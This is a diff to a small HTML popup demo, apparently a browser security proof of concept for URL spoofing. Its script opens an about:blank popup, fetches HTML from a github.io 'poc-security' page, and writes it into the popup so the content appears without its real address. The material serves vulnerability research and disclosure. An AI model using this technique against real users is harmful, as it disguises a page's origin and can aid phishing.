@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Popup Demo</title>
+    <title>Popup Demo - Spoofed URL</title>
     <style>
         body {
             display: flex;
@@ -34,9 +34,31 @@
     <button id="openPopupBtn">Open Popup</button>
 
     <script>
+        // Daftar URL yang akan dimuat di popup
+        const targetUrl = 'https://nuribnuu.github.io/poc-security/tel-protocol-spoofing/';
+        
         document.getElementById('openPopupBtn').addEventListener('click', function() {
-            // Ukuran popup bisa disesuaikan
-            window.open('https://nuribnuu.github.io/poc-security/fullscreen-notification-missing/', '_blank', 'width=400,height=400,scrollbars=yes,resizable=yes');
+            // Buka popup dengan URL about:blank
+            const popup = window.open('about:blank', '_blank', 'width=400,height=400,scrollbars=yes,resizable=yes');
+            
+            if (!popup) {
+                alert("Popup blocked! Please allow popups.");
+                return;
+            }
+            
+            // Ambil konten dari target URL menggunakan fetch
+            fetch(targetUrl)
+                .then(response => response.text())
+                .then(html => {
+                    // Tulis konten yang diambil ke dalam popup
+                    popup.document.write(html);
+                    popup.document.close(); // Penting untuk memastikan dokumen selesai dimuat
+                })
+                .catch(error => {
+                    console.error('Gagal mengambil konten:', error);
+                    popup.document.write('<h1>Error loading content</h1>');
+                    popup.document.close();
+                });
         });
     </script>
 </body>
